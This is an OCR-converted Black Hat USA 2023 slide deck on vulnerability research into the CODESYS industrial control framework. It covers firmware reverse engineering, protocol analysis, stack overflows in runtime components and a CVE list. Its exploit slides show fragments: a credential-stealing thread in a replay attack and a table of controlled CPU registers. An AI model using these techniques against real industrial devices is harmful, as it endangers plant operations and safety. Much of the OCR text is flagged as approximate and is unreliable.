---
title: "CoDe16; 16 Zero-Day Vulnerabilities Affecting CODESYS Framework Leading to Remote Code Execution on Millions of Industrial Devices Across Industries"
speakers: ["Vladimir Eliezer Tokarev"]
conference: "Black Hat"
conference_full: "Black Hat USA 2023"
edition: "USA"
year: 2023
source_pdf: "Black Hat USA 2023 slides/Vladimir Eliezer Tokarev_CoDe16; 16 Zero-Day Vulnerabilities Affecting CODESYS Framework Leading to Remote Code Execution on Millions of Industrial Devices Across Industries.pdf"
pages: 177
sha256: "c0af6f22fc70ea243220d223344a56dfa5561bd0cc5993fc02d0209ee17f7b39"
text_chars: 80188
ocr_pages: 124
has_ocr: true
redacted_secrets: 0
ocr_confidence: 80.8
ocr_unreliable_blocks: 12
vision_verified_blocks: 11
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T04:28:20Z"
---
# CoDe16; 16 Zero-Day Vulnerabilities Affecting CODESYS Framework Leading to Remote Code Execution on Millions of Industrial Devices Across Industries

**Speakers:** Vladimir Eliezer Tokarev  
**Conference:** Black Hat USA 2023  
**Source:** `Black Hat USA 2023 slides/Vladimir Eliezer Tokarev_CoDe16; 16 Zero-Day Vulnerabilities Affecting CODESYS Framework Leading to Remote Code Execution on Millions of Industrial Devices Across Industries.pdf` (177 pages)


## Slide 1

## CoDe16;

16 zero-day vulnerabilities affecting CODESYS framework leading to remote code execution on millions of industrial devices across industries.

Speaker(s):

Vladimir Tokarev

#BHUSA  @BlackHatEvents

## Slide 2

- Introduction

#BHUSA  @BlackHatEvents

## Slide 3

### What is CODESYS ?

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
USA &
What is CODESYS ? CODESYS
```

## Slide 4

### What is CODESYS ? CODESYS Eco-System

https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.iqhome.org%2Fsolutions%2Fcodesys&psig=AOvVaw3xn_Ex-WBk90MFBZ1jYu0t&ust=1690293265471000&source=images&cd=vfe&opi=89978449&ved=0CBEQjRxqFwoTCPiFm8vAp4ADFQAAAAAdAAAAABAE

#BHUSA  @BlackHatEvents

## Slide 5

### What is CODESYS ? CODESYS Eco-System

### Research Focus

https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.iqhome.org%2Fsolutions%2Fcodesys&psig=AOvVaw3xn_Ex-WBk90MFBZ1jYu0t&ust=1690293265471000&source=images&cd=vfe&opi=89978449&ved=0CBEQjRxqFwoTCPiFm8vAp4ADFQAAAAAdAAAAABAE

#BHUSA  @BlackHatEvents

## Slide 6

### How is CODESYS used ?

#BHUSA  @BlackHatEvents

## Slide 7

### How is CODESYS used ?

#BHUSA  @BlackHatEvents

## Slide 8

### How is CODESYS used ?

#BHUSA  @BlackHatEvents

## Slide 9

### How is CODESYS used ?

#BHUSA  @BlackHatEvents

## Slide 10

### How is CODESYS used ?

#BHUSA  @BlackHatEvents

## Slide 11

### How is CODESYS used ?

#BHUSA  @BlackHatEvents

## Slide 12

Some Major Vendors :

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Some Major Vendors :
BECKHOFF PHCENIX
CONTACT
PRODUCTS SOLUTIONS INDUSTRIES CAREERS COMPANY CUSTOMER SERVICE DOWNLOADS BLOG
— . PRODUCTS INDUSTRIES & APPLICATIONS COMPANY EVENTS & NEWS
Share Price (@) Global(English)
Search products, documents & more
Products Solutions Services Support Investors About us
PADDED Products Industries Service
```

## Slide 13

On what CODESYS Runs ? CPU

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
USA &
On what CODESYS Runs ? PowerPl
CPU
ELEVATING RISC-V
TriCore® 1
32-bit Unified Processor Core
arm
```

## Slide 14

On what CODESYS Runs ? OSes

#BHUSA  @BlackHatEvents

## Slide 15

### CODESYS worldwide:

#BHUSA  @BlackHatEvents

## Slide 16

### CODESYS SDK as Supply Chain Attack Vector

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CODESYS SDK as supply Chain Attack Vector
ROJANISED SOFTWARE
```

## Slide 17

### Analysis Techniques: Setting The Playground

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 81/100 on the text kept, 53/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
©
ul
Cc
=)
>
a
oO
Cc
Y)
=)
Cc
O
Y)
=
O
Cc
T Remove this sticker
to connect
Expansion Module
@BlackHatEvents
#BHUSA
```

## Slide 18

### Analysis Techniques: Reverse Engineering  TM251

#BHUSA  @BlackHatEvents

## Slide 19

### Analysis Techniques: Reverse Engineering  TM251

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 76/100 on the text kept, 73/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
LUISA 202
Analysis Techniques: Reverse Engineering TM251
a@a-virtual-machine: ¢ $ binwalk -e -M M251_4.3.9.13_19.12.11.1.seco
format (1509 v3),
390877 OxSF540 certificate tn DER header Length:
4, sequence Length: 1292
408777 0x63111 Certificate in DER format (x569 v3), header length: 4, sequence 5376
958157 OXESECD Certificate {n DER format (x509 v3), header length: 4, sequence 5376
958237 OxESFIO Certificate in DER format (x509 v3), header length: 4, sequence 2 5376
1453061 (0x162c05 Certificate in DER format (x509 v3), header length: 4, sequence 2 5424
1622441 ox18c1as Certificate tn DER format (x509 v3), header length: 4, sequence Length: 5376
1699996 ox19Fe9c SHAZS6 hash constants, Little endian
3822381 Ox1BCEAD Certificate tn DER format (x509 v3), header length: 4, sequence Length: 512
1982037 exic6785 Certificate in DER format (x509 v3), header length: 4, sequence length: 1424
1883141 ox1c6cos Certificate in DER format (x509 v3), header length: 4, sequence length: 1440
3092413 ox1cee30 Certificate tn DER format (x589 v3), header length: 4, sequence Length: 1460
1895981 @x1ceez0 Certificate in DER format (x509 v3), header length: 4, sequence 5580
1896173 OxICEEED Certificate {n DER format (x509 v3), header length: 4, sequence 5584
1898653 @xicF890 Certificate in DER format (x59 v3), header length: 4, sequence 1528
1899437 Ox1CFBAD Certificate in DER format (x509 v3), header length: 4, sequence 1524
2081869 Ox1FC44D Certificate tn DER format (x59 v3), header length: 4, sequence length: 5376
3888903 (0x385707 Untx path: /usr/systog/PlcLog
389342 0x38588€ Copyright string: "Copyright Infornation that will appear in the telnet screen and the revision of this personality file.
3915584 0x388F40 gzip compressed data, has original file name: "Codesys.tco", fron FAT ftlesysten (MS-DOS, 05/2, NT), Last modified: 2009-01-07 14:17:32
3926272 (0x38£900 gzip conpressed data, maxtnun compression, has original file nane: "A25BIcon.tco", fron FAT filesysten (MS-DOS, 05/2, NT), last modified: 2016-61-21 10:39:25
3941692 0xa253C CRC32 polynontal tabie, Little endian
3948640 0x3¢4060 cRC32 polynontal table, Little endian
3949803 Ox3Ca4ES Copyright string: "Copyright 1995-2002 Jean-loup Gattly
3950423 (0x3C4757 Copyright string: "Copyright 1995-2002 Hark Adler *
3974248 Ox3CA468 SHA2S6 hash constants, Little endian
3978592 @x3CASCO Base6a standard index table
3978964 oxacB6Ds CRC32 polynontal table, Little endian
3992132 Ox3cEAas Copyright string: "Copyright 1984-2004 Wind River systens, Inc.
4079066 (0x3E3008 Copyright string: "copyright Wind River Systens, Inc., 1984-"
4130068, oxaF05i4 AES Inverse S-80x
4149656 0x3F5198 Copyright string: "copyright (c) Interpeak AB 2600-2010. ALL rights reserved.”
4245540 oxa0ce2s nix path: /dev/root/nac.dat
4276776 0x414228 Copyright string: "Copyright (c) 35 - Smart Software Solutions GnbH"
4202244 0x415784 HTML docunent header
4282408 0x415828 HTML docunent footer
4283964 ox415e3C HTAL docunent header
4284065, Ox4i5ea1 HTML docunent footer
4293668 ox418424 HTML docunent header
4293832 oxai84cs HTML docunent footer
4293844 ox4ie404 HTML docunent header
4293969 ox418551 HTML docunent footer
4293980 ox4i855c HTML docunent header
4294054 0x4185A6 HTML docunent footer
4294064 0x418580 HTML docunent header
4294220, oxai86ac HTML docunent footer
4300688 0x419F90 Untx path: /usr/Syslog/FuLog.bak
4301804, Ox41A3EC Untx path: /usr/Syslog/hear theatxd.wvr
4454300 0x43F79C Netghborly text, "Netghbor-Bs"
```

## Slide 20

### Analysis Techniques: Reverse Engineering  TM251

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 69/100 on the text kept, 44/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Analysis Techniques: Reverse Engineering TM251
|-- M251.BPD _
-- _M251.BPD.extracted
a@a-virtual-machine: ¢ $ binwalk -e -M M251_4.3.9.13_19.12.11.1.seco
ise osesan Certificate tn DER fornat (4509 va), header Length: 4, sequence Length: 1292 |
1802037 exice7es Certificate in DER format (4509 v3), Sequence length -- _Image.tar.extracte
tosses oxsise2# TAL docunent header | | | | -- M258Icon.ico
Siosses—scenseset IML ecanent. footer | | | |-- pltdkmcustom.out
4454300 0x43F79C Netghborly text, "Netghbor-s
```

## Slide 21

### Analysis Techniques: Reverse Engineering  TM251

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 52/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Analysis Techniques Reverse Engineering TM251
SECURITY |
EXPERTS
```

## Slide 22

### Analysis Techniques: Reverse Engineering  TM251

#BHUSA  @BlackHatEvents

## Slide 23

### Analysis Techniques: Reverse Engineering  TM251

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Analysis Techniques: Reverse Engineering TM251
github.com
basefind2
usage: basefind2.py [-h] [-sl STRLENGTH] [-dl DIFFLENGTH] [-s SAMPLERATE] file
Scans a flat 32-bit binary and attempt to determine the base address.
Finds DIFFLENGTH part of the subsequent string differences inside the
subsequent pointer differences to get base candidates. It doesn't need
to brute-force all of the base addresses, so it's much faster. Based on
the excellent basefind.py by mncoppola and the excellent rbasefind.
```

## Slide 24

Analysis Techniques: Reverse Engineering  TM251

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Analysis Techniques: Reverse Engineering TM251
=f determine_base_offset( ):
```

## Slide 25

### Analysis Techniques: Ida Python Custom Project

- Manual Segmentation

- Strings Redefinition

- Methods Redefinition

- Reference Table Definition

- Renaming Based On Log/Suffix/Inheritance

- Renaming Based On Reference Table

#BHUSA  @BlackHatEvents

## Slide 26

Analysis Techniques: Ida Python Custom Project

For more information & white paper checkout : <u>16 https://github.com/microsoft/CoDe</u>

#BHUSA  @BlackHatEvents

## Slide 27

### Analysis Techniques: Reverse Engineering  TM251

`

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 47/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LUISA &U:
Analysis Techniques: Reverse Engineering TM251
4
oo
```

## Slide 28

### Analysis Techniques: Reverse Engineering  TM251

`

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 47/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LUISA &U:
Analysis Techniques: Reverse Engineering TM251
4
oo
```

## Slide 29

### Analysis Techniques: Reverse Engineering  TM251

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 80/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Analysis Techniques: Reverse Engineering TM251
Function Instruction
AppGenerateCreateAppser...
dword_
dword_20 c DecDO ; DATA XREF: sub_2035B28+8D8tr
sub_20F7680+68 tr
```

## Slide 30

Analysis Techniques: Reverse Engineering  TM251

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Address
Analysis Techniques: Reverse Er
Function
AppGenerateCreateApps
+ DATA
FF: AppGenerateCreateAppService2 +4 tr
sub_20F7680+68 tr
```

## Slide 31

Analysis Techniques: CODESYS Documentation

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 73/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
¥ ~=6 Analysis Techniques: CODESYS Documentation
SysFilewrite (FUN)
```

## Slide 32

Analysis Results: CODESYS Network protocol

Tags
Service
Layer

Channel Layer
Datagram Layer
Block Driver Layer

#BHUSA  @BlackHatEvents

## Slide 33

Analysis Results: CODESYS Network protocol

Tags Service Layer

Channel Layer

Datagram Layer

Block Driver Layer

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 83/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Analysis Results: CODESYS Network protocol oe
Block Driver Layer
Frame 10: 86 bytes on wire (688 bits), 86 bytes captured (688 bits) on interface \Devil 45
Ethernet II, Src: Telemech_3d:00:37 (00:80:f4:3d:00:37), Dst: VMware_1c:ef:c7 (@0:0c:2 @a
Internet Protocol Version 4, Src: 10.10.0.55, 10.10.0.112 e 6 oe
Y User Datagram Protocol, Src Port: 1740, Dst Port: 1740 ob co 90 on 3 Oe ae
Source Port:]1740 a
Destination Port:]1740
Checksum
[Checksum Stat Unverified]
[Stream ind 1)
UDP payload (44 bytes)
CoDeSys V3 Protocol Data
```

## Slide 34

Analysis Results: CODESYS Network protocol

Tags
Service
Layer

Channel Layer

Datagram Layer

Block Driver Layer

#BHUSA  @BlackHatEvents

## Slide 35

Analysis Results: CODESYS Network protocol

Tags
Service
Layer

Channel Layer

Datagram Layer

Block Driver Layer

#BHUSA  @BlackHatEvents

## Slide 36

Analysis Results: CODESYS Network protocol

Tags
Service
Layer

Layer
Channel Layer

Datagram Layer

Block Driver Layer

#BHUSA  @BlackHatEvents

## Slide 37

### Analysis Results: CODESYS Network protocol

Tags

Service
Layer

Channel Layer

Datagram Layer

Block Driver Layer

#BHUSA  @BlackHatEvents

## Slide 38

### Analysis Results: CODESYS Network protocol Fragmentation

First Segmented packet Second Segmented packet

ACK on Segmented data

#BHUSA  @BlackHatEvents

## Slide 39

### Analysis Results: Service Handlers & CMP & Services IDs

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LUISA 202
Analysis Results: Service Handlers & CMP & Services IDs °
; DATA XREF: App
EF: A
```

## Slide 40

### Analysis Results: Service Handlers & CMP & Services IDs

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LUISA 202
Analysis Results: Service Handlers & CMP & Services IDs
; DATA XREF: A
; DATA XREF:
```

## Slide 41

### Analysis Results: Service Handlers & CMP & Services IDs

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LUISA 202
Analysis Results: Service Handlers & CMP & Services IDs
Function Instruction
AppGenerateAppll
AppGenerateCreateAppSer
AppLoadBootprojectService
```

## Slide 42

### Analysis Results: Service Handlers & CMP & Services IDs

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LUISA 202
Analysis Results: Service Handlers & CMP & Services IDs
Instruction
AppGener.
AppLoadBootpr
; DATA XREF: si
```

## Slide 43

### Analysis Results: Service Handlers & CMP & Services IDs

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LUISA 202
Analysis Results: Service Handlers & CMP & Services IDs
Function Instruction
AppGenerateAppll
AppGenerateCreateAppSer
AppLoadBootprojectService
```

## Slide 44

### Analysis Results: Service Handlers & CMP & Services IDs

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LUISA 202
Analysis Results: Service Handlers & CMP & Services IDs
Function Instruction
AppGenerateAppll
AppGenerateCreateAppSer
AppLoadBootprojectService
```

## Slide 45

### Analysis Results: Service Handlers & CMP & Services IDs

#BHUSA  @BlackHatEvents

## Slide 46

|Analysis Results: Service Handlers|
|---|

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 80/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Service Name Service ID
CmpDevice Ox01
CmpApp 0x02
CmpVisuServer 0x04
CmpLog 0x05
CmpSettings 0x06
SysEthernet 0x07
CmpFileTransfer 0x08
CmpLecVarAccess 0x09
CmpLoMegr Ox0B
PicShell Ox11
CmpAppBp Ox12
CmpAppForce 0x13
CmpAlarmManager 0x18
CmpMonitor 0x1B
CmpCodeMeter 0Ox1D
CmpCoreDump Ox1F
CmpOpenSSL Ox22
```

## Slide 47

### Analysis Results: Day in a life of CODESYS packet

Datagram Layer
Channel
Layer
Service
Layer

#BHUSA  @BlackHatEvents

## Slide 48

Analysis Results: Day in a life of CODESYS packet

Datagram Layer
Channel
Layer
Service
Layer

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
blackhat
LISA 2025 Analysis Results: Day ina life of CODE
(
&&
&& !RouterGetBlkAddresses ((
RouterHandleData_@
-current_hop_count )
-hop_count;
ss_type !=1 )
@, 24, 16, @, 2, InvalidAddressTypoe4,
-address_type = @; NetServerHandleMessage3
-hop_count =
)& .sender_r size = *( ) .sender_reicever_size;
return @;
```

## Slide 49

### Analysis Results: Day in a life of CODESYS packet

Datagram Layer
Channel
Layer
Service
Layer

#BHUSA  @BlackHatEvents

## Slide 50

Analysis Results: Day in a life of CODESYS packet

Datagram Layer
Channel
Layer
Service
Layer

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
blackhat
: Analysis Results: Day in a life of COD
16,
RecivedDuplicatedBlock[@],
- 1,
-address_type,
-hop_count,
-current_hop_count,
-pointer_to_sender_reciever_data);
eave(*
return @;
->send_mode_or_recieve_mode, 2, 4, 1);
NetServerHandleMessage3
NetClientMessageReceived ( (
```

## Slide 51

### Analysis Results: Day in a life of CODESYS packet

Datagram Layer
Channel
Layer
Service
Layer

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
blackhat
LISA @Oes Analysis Results: Day ina life of CODE
- channel _id);
i O % *MaxChannels[@]));
= @x37
» ServerAppHandlerRequestReturnedErrorC
)
```

## Slide 52

### Analysis Results: Day in a life of CODESYS packet

Datagram Layer
Channel
Layer
Service
Layer

#BHUSA  @BlackHatEvents

## Slide 53

Analysis Results: Components, CMPApp

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 81/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
USA &
{
ServerRegisterServiceHandler_@(2, CMPAppServiceHandler_®@) ;
return @;
}
```

## Slide 54

Analysis Results: Components, CMPApp

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 74/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LUISA @O: Analysis Results: Components, CMPApp- ae
{
return @;
```

## Slide 55

### Analysis Results: Components, CMPApp

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LISA & Analysis Results
{
return @;
Handler2(
8DC;
```

## Slide 56

# Analysis Results: Components, CMPApp Stack Based Overflow

#BHUSA  @BlackHatEvents

## Slide 57

### Analysis Results: Components, CMPApp

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LISA 2&0: Analysis Results: Components, CMPApp-
{
return @;
Handler2(
8DC;
```

## Slide 58

Analysis Results: Components, CMPApp

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 80/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
black ha
Q
{
return @;
CWE-1288
teHandler(
s #BHUSA @BlackHatEvents
```

## Slide 59

### Analysis Results: Components, CMPTraceMgr

#BHUSA  @BlackHatEvents

## Slide 60

Analysis Results: Components, CMPTraceMgr

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LISA &U:
return Serve eHandler_@(@xF, ( )CmpTraceMgrServiceHandlerPointer) ;
```

## Slide 61

### Analysis Results: Components, CMPTraceMgr

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LISA &OU: Analysis Results: Components,
return ServerRegisterServiceHandler_@(@xF, ( )CmpTraceMgrServiceHandlerPointer) ;
```

## Slide 62

# Analysis Results: Components, CMPTraceMgr Stack Based Overflow

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 81/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LISA @&@
return ServerRegisterServiceHandler_@(@xF, ( )CmpTraceMg St a ( k B a S e d
tent( »& )3
.ulBufferEntries,
```

## Slide 63

Analysis Results: Components, CMPTraceMgr

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LISA &U:
return ServerRegi rServiceHandler_@(@xF, ( )CmpTraceMgrServiceHandlerPointer) ;
-ulGraph
```

## Slide 64

### Analysis Results: Components, CMPTraceMgr

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
return ServerRegisterServiceHandler_@(@xF, ( )CmpTraceMgrServiceHandlerPointer) ;
BTagReaderGe
d
.field_48
.field_4c
-ulGraphCo
```

## Slide 65

# Analysis Results: Components, CMPTraceMgr Stack Based Overflow

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
L
return ServerRegiste
yiceHandler_@(@xF, ( )CmpTrac
.field_48
.field_4c
-ulGraphColor;
Stack Based
verflow
.field_44);
#BHUSA
@BlackHatEvents
```

## Slide 66

### Analysis Results: Components, CMPDevice

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 74/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LUISA 2&0: Analysis Results: Components, CMPDevi: x
```

## Slide 67

### Analysis Results: Components, CMPDevice

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 74/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LUISA 2&0: Analysis Results: Components, CMPDevi: x
```

## Slide 68

### Analysis Results: Components, CMPDevice

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 72/100 on the text kept, 63/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LUISA 2&2 Analysis Results: Components, CMPDevi a
```

## Slide 69

### Analysis Results: Components, CMPDevice

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 72/100 on the text kept, 63/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LUISA 2&2 Analysis Results: Components, CMPDevi a
```

## Slide 70

### Analysis Results: Components, CMPDevice

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 79/100 on the text kept, 61/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LISA @Oe Sd Analysis Results: Components, CMPDevi
if (
```

## Slide 71

### Analysis Results: Components, CMPDevice

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Description
An issue was discovered in 3S-Smart CODESYS V3 products. The application may utilize non-TLS basec ryption, which results in user
ing insufficiently protected during transport. All variants of the following CODESYS V3 products in all versions containing the
CmpUserMgr component are affected rdless of the CPU type or operating sy ODESYS Control for BeagleBone, CODESYS Control for
emPC-A/ , CODESYS Control for |OT , CODESYS Control for Linux, CODESYS Control for PFC100, CODESYS Control for PFC200, CODESYS
Control for Raspberry Pi, CODESYS Control RTE V3, CODESYS Control RTE V3 (for Beckhoff Cx), CODESYS Control Win V3 (also part of the
CODESYS Development System setup), CODESYS V3 Simulation Runtime (part of the CODESYS Development System), CODESYS Control V3
Runtime System Toolkit, CODESYS HMI V3.
```

## Slide 72

### Analysis Results: Components, CMPDevice

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LISA 2&0 Analysis Results: Coms
Description
An issue was discovered in 3S-Smart CODESYS V3 products. The application may utilize non-TLS based encr}
credentials being insufficiently protected during transport. All variants of the following CODESY
CmpUserMgr component are affected regardless of the CPU type or operating
emPC-A/iMX6, CODESYS
CODESYS Development S m setup), CODESYS V3 Simulation Runtime (part of the CODESYS Development System), CO
em Toolkit, CODESYS HMI V3.
Runtime
```

## Slide 73

### Vulnerabilities Exposition

#### <u>Security Reports (codesys.com)</u>

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 81/100 on the text kept, 56/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CODESYS Component wpact
CVE-2022-47385 CmpAppForce
CVE-2022-47386 CmpTraceMgr
CVE-2022-47387 CmpTraceMor
CVE-2022-47388
| CVE-2022-47390 sd 2022-47390 /CMPTraceMgr id
CVE-2022-47391 CMPDevice
CVE-2022-47392 CmpApp/ CmpAppBP/
CmpAppForce
CVE-2022-47393 CmpFiletransfer
Security Reports (codesys.com)
```

## Slide 74

Vulnerabilities Exposition

#### <u>Security Reports (codesys.com)</u>

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
| CVE-2022-47378
| CVE-2022-47381
CVE-2022-47384
CVE-2022-47385
CVE-2022-47386
CVE-2022-47387
CVE-2022-47388
CVE-2022-47389
CVE-2022-47390
CVE-2022-47391 DOS
CVE-2022-47392 CmpApp/ CmpAppBP/
CmpAppForce
| CVE-2022-47393 CmpFiletransfer
Security Reports (codesys.com)
```

## Slide 75

Exploit Replay Attack Why we need it ?

#BHUSA  @BlackHatEvents

## Slide 76

Exploit

Replay Attack

#BHUSA  @BlackHatEvents

## Slide 77

Replay Attack

Exploit

#BHUSA  @BlackHatEvents

## Slide 78

Exploit Replay Attack

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 76/100 on the text kept, 70/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Exploit USA & Replay Attack
80
94
9a
56 Q3|81 @1 ac 00/10 06 72 6f 6f 7
7@ 68 58 54 68 75 83 3f 70 68 82 4 stealing_thread = threading. Thread( =credentials_stealer)
```

## Slide 79

Exploit

Vuln to Exploit (Corruption)

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 73/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Vuln to Exploit (Corruption) _ cil ef 7
Exploit LISA &
```

## Slide 80

Exploit

Vuln to Exploit (Corruption)

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 74/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exploit USA 2&0 Vuln to Exploit (Corruption) - rr >:
derGetContent(
configuration; /
```

## Slide 81

Exploit Vuln to Exploit (Corruption) Stack Based Overflow

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exploit USA &Oi Vuln to Exploit (Cc
Stack Based
Overflow
»& )3
-ulEveryNCycles,
TracePacketConfiguration p_trace_packet_configuration; //
TracePacketConfigur
unsigned int tag_id; //
```

## Slide 82

### Exploit

Vuln to Exploit (Corruption)

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 68/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Vuln to Exploit (Corruption) ust es 7
Exploit USAc&
```

## Slide 83

### Vuln to Exploit (Corruption)

### Exploit

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 75/100 on the text kept, 58/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Exploit
Vuln to Exploit oun gusce
16800180
: e1a02005
: e1a04006
30800180
17000180
e1a03005
@2d8e6cc
31000180
35000180
18000100
e1a04005
80000008
32000100 33
36000100
e1a01005
900100
37000100
```

## Slide 84

### Vuln to Exploit (Corruption)

### Exploit

|**R4**|**16000100**|
|---|---|
|R5|17000100|
|R6|18000100|
|R7|19000100|
|R8|1a000100|
|R9|1b000100|
|R10|1c000100|
|R11|1d000100|
|SP|1e000100|
|PC|1f000100|

#BHUSA  @BlackHatEvents

